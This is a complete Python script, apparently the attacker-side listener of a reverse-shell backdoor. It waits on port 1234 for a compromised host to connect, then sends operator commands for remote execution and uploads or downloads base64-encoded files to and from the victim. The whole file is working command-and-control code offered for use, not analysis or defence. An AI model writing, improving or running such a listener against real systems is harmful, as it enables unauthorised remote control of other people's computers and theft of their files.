#!/usr/bin/python3

import socket
import json
import base64


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for Incoming Connection")
        self.connection, address = listener.accept()
        print("[+] Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())  # encode to bytes

    def reliable_receive(self):
        json_data = b""  # bytes object for data accumulation
        while True:
            try:
                json_data += self.connection.recv(1024)  # receive bytes
                return json.loads(json_data.decode())  # decode to string before parsing
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # return as a string

    def run(self):
        while True:
            command = input(">> ")  # changed from raw_input() to input()
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

            except Exception as e:
                result = f"[-] Error during command execution: {str(e)}"

            print(result)


my_listener = Listener("0.0.0.0", 1234)
my_listener.run()
